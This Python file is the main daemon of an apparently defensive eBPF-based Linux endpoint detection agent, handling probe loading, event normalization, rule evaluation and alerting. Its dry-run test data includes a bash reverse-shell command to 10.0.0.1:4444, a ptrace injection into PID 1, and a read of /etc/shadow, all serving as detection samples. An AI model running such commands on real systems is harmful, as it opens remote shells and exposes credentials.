"""
Main Agent Daemon for eBPF-Powered Linux Runtime Threat Detection & EDR Agent.

Orchestrates BPF probe compilation and attachment, multi-threaded ring buffer polling,
real-time telemetry normalization, YAML rule evaluation, and alert dispatching.
"""

import argparse
import logging
import os
import queue
import signal
import sys
import threading
import time
from typing import Optional

from agent.core.bpf_loader import BPFLoader, HAS_BCC
from agent.core.event_normalizer import EventNormalizer
from agent.detection.rule_engine import RuleEngine
from agent.alerts.output_handler import OutputHandler

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("edr_agent")


class EDRAgent:
    """
    Main EDR Sensor Daemon.
    """

    def __init__(
        self,
        rules_dir: str,
        bpf_dir: str,
        alert_file: Optional[str] = None,
        output_format: str = "pretty",
        enable_stdout: bool = True,
        enable_syslog: bool = False,
    ):
        self.rules_dir = os.path.abspath(rules_dir)
        self.bpf_dir = os.path.abspath(bpf_dir)
        self.event_queue: queue.Queue = queue.Queue(maxsize=10000)

        # Core Components
        self.normalizer = EventNormalizer()
        self.rule_engine = RuleEngine(rules_dir=self.rules_dir)
        self.output_handler = OutputHandler(
            alert_file=alert_file,
            output_format=output_format,
            enable_stdout=enable_stdout,
            enable_syslog=enable_syslog,
        )
        self.bpf_loader = BPFLoader(
            bpf_dir=self.bpf_dir,
            event_queue=self.event_queue,
        )

        self.running = False
        self._worker_thread: Optional[threading.Thread] = None

    def _worker_loop(self):
        """Telemetry processing worker loop."""
        logger.info("Telemetry evaluation worker started.")
        while self.running or not self.event_queue.empty():
            try:
                raw_data = self.event_queue.get(timeout=0.2)
            except queue.Empty:
                continue

            try:
                # 1. Normalize binary struct into standard dictionary
                normalized_event = self.normalizer.normalize(raw_data)
                if not normalized_event:
                    self.event_queue.task_done()
                    continue

                # 2. Evaluate against detection rules
                alerts = self.rule_engine.evaluate(normalized_event)

                # 3. Emit matched alerts
                for alert in alerts:
                    self.output_handler.emit(alert)

            except Exception as e:
                logger.error(f"Error processing telemetry event: {e}", exc_info=True)
            finally:
                self.event_queue.task_done()

        logger.info("Telemetry evaluation worker stopped.")

    def start(self):
        """Starts the EDR agent daemon."""
        logger.info("=" * 60)
        logger.info("Starting eBPF-Powered Linux Runtime Threat Detection Agent")
        logger.info(f"Rules Directory: {self.rules_dir}")
        logger.info(f"BPF Directory:   {self.bpf_dir}")
        logger.info("=" * 60)

        self.running = True

        # Start background worker thread
        self._worker_thread = threading.Thread(
            target=self._worker_loop, name="edr-event-worker", daemon=True
        )
        self._worker_thread.start()

        # Load BPF Probes and start polling
        if not self.bpf_loader.load_all_probes():
            logger.error("Failed to load BPF probes. Exiting agent.")
            self.stop()
            sys.exit(1)

        self.bpf_loader.start_polling()
        logger.info("EDR Agent active and monitoring kernel events. Press Ctrl+C to terminate.")

    def stop(self):
        """Gracefully shuts down the agent daemon."""
        if not self.running:
            return

        logger.info("Initiating graceful shutdown...")
        self.running = False

        # Stop BPF probes
        self.bpf_loader.unload_all()

        # Join worker thread
        if self._worker_thread and self._worker_thread.is_alive():
            self._worker_thread.join(timeout=3.0)

        logger.info("EDR Agent shutdown complete.")

    def run_dry_run(self):
        """
        Executes synthetic detection tests to verify normalization, rules, and alerts.
        """
        logger.info("[DRY RUN] Executing synthetic telemetry verification suite...")

        synthetic_events = [
            # 1. Reverse Shell Event (EXECVE)
            {
                "timestamp_utc": "2026-09-08T12:00:00.000000Z",
                "event_type": "EXECVE",
                "pid": 1337,
                "tgid": 1337,
                "ppid": 1000,
                "uid": 1000,
                "gid": 1000,
                "comm": "bash",
                "filename": "/bin/bash",
                "args": "-i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "cmdline": "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                "retval": 0,
            },
            # 2. Process Injection Event (PTRACE)
            {
                "timestamp_utc": "2026-09-08T12:00:01.000000Z",
                "event_type": "PTRACE",
                "pid": 2048,
                "tgid": 2048,
                "ppid": 1000,
                "uid": 1000,
                "gid": 1000,
                "comm": "injector",
                "ptrace_request": "PTRACE_POKETEXT",
                "ptrace_request_code": 4,
                "target_pid": 1,
                "addr": "0x7fff12345678",
                "data": "0x90909090",
            },
            # 3. Privilege Escalation Event (EXECVE)
            {
                "timestamp_utc": "2026-09-08T12:00:02.000000Z",
                "event_type": "EXECVE",
                "pid": 31337,
                "tgid": 31337,
                "ppid": 1000,
                "uid": 0,
                "gid": 0,
                "comm": "sh",
                "filename": "/bin/sh",
                "args": "",
                "cmdline": "/bin/sh",
                "retval": 0,
            },
            # 4. Sensitive File Access Event (OPENAT)
            {
                "timestamp_utc": "2026-09-08T12:00:03.000000Z",
                "event_type": "OPENAT",
                "pid": 4096,
                "tgid": 4096,
                "ppid": 1000,
                "uid": 1000,
                "gid": 1000,
                "comm": "cat",
                "filepath": "/etc/shadow",
                "file_path": "/etc/shadow",
                "flags": 0,
                "flags_desc": "O_RDONLY",
                "dfd": -100,
                "retval": 0,
            },
        ]

        total_alerts = 0
        for ev in synthetic_events:
            normalized = self.normalizer.normalize(ev)
            alerts = self.rule_engine.evaluate(normalized)
            for alert in alerts:
                total_alerts += 1
                self.output_handler.emit(alert)

        logger.info(
            f"[DRY RUN] Verification Complete: {len(synthetic_events)} synthetic events evaluated, "
            f"{total_alerts} threat detections triggered."
        )


def find_default_path(sub_path: str) -> str:
    """Finds path relative to repository root or current directory."""
    cwd = os.getcwd()
    candidates = [
        os.path.join(cwd, sub_path),
        os.path.join(cwd, "..", sub_path),
        os.path.join(os.path.dirname(__file__), "..", sub_path),
    ]
    for c in candidates:
        if os.path.exists(c):
            return os.path.abspath(c)
    return os.path.abspath(candidates[0])


def main():
    parser = argparse.ArgumentParser(
        description="eBPF-Powered Linux Runtime Threat Detection & EDR Agent"
    )
    parser.add_argument(
        "--rules-dir",
        type=str,
        default=find_default_path("rules"),
        help="Path to YAML detection rules directory (default: ./rules)",
    )
    parser.add_argument(
        "--bpf-dir",
        type=str,
        default=find_default_path("bpf"),
        help="Path to BPF C probe source directory (default: ./bpf)",
    )
    parser.add_argument(
        "--alert-file",
        type=str,
        default="/var/log/edr_alerts.json" if sys.platform.startswith("linux") else "./edr_alerts.json",
        help="Path to append JSON alert logs (default: /var/log/edr_alerts.json)",
    )
    parser.add_argument(
        "--output-format",
        choices=["pretty", "json"],
        default="pretty",
        help="Stdout output format (pretty / json)",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Run synthetic detection test suite without loading kernel BPF probes",
    )
    parser.add_argument(
        "--no-stdout",
        action="store_true",
        help="Disable printing alerts to stdout",
    )
    parser.add_argument(
        "--syslog",
        action="store_true",
        help="Enable forwarding alerts to Linux syslog",
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable debug logging",
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    agent = EDRAgent(
        rules_dir=args.rules_dir,
        bpf_dir=args.bpf_dir,
        alert_file=args.alert_file,
        output_format=args.output_format,
        enable_stdout=not args.no_stdout,
        enable_syslog=args.syslog,
    )

    if args.dry_run:
        agent.run_dry_run()
        return

    # Signal handling for clean exit
    def sig_handler(sig, frame):
        logger.info(f"Received signal {sig}. Terminating...")
        agent.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    agent.start()

    # Keep main thread alive
    try:
        while agent.running:
            time.sleep(1.0)
    except KeyboardInterrupt:
        pass
    finally:
        agent.stop()


if __name__ == "__main__":
    main()
